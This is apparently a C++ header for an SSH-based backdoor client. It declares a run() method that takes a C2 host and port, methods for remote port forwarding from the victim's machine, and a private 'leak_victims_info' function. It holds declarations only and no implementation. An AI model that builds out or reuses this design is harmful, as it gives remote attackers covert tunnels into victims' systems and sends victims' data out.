#pragma once

#include "global.h"
#include <vector>
#define CLIENT_SENT_EOF -6
#define SERVICE_SENT_EOF -5
#define SERVICE_CONN_ERROR -4
#define SSH_SENT_EOF -3
#define SYSTEM_ERROR -2

#define ACCEPT_FORWARD_TIMEOUT 50	// ms


class SSHClient
{
public:
    SSHClient();

	

	static int run(const char* username, const char* C2_host, unsigned short C2_port, unsigned short local_SSH_binded_port);
    static int should_terminate;
private:
	static int connect_to_local_service(int port);
	static int do_remote_forwarding_loop(ssh_session session, ssh_channel channel, int lport, pthread_mutex_t* mutex);
	static void remote_forwading_thread(ssh_session sess, ssh_channel chan, int lport, pthread_mutex_t* mutex, std::vector<std::thread*>* thread_vector);
    static int leak_victims_info(ssh_session session, const int binded_port);
	static void do_remote_forwarding(ssh_session sess, int lport, pthread_mutex_t* mutex, std::chrono::time_point<std::chrono::system_clock>* last_keep_alive);

    static void global_requests_cb(ssh_session session, ssh_message message, void* userdata);

    static pthread_mutex_t mutex;
    static std::vector<std::thread> thread_vector;
#ifdef PASSWORD_AUTH
    static char password[30];
#endif
};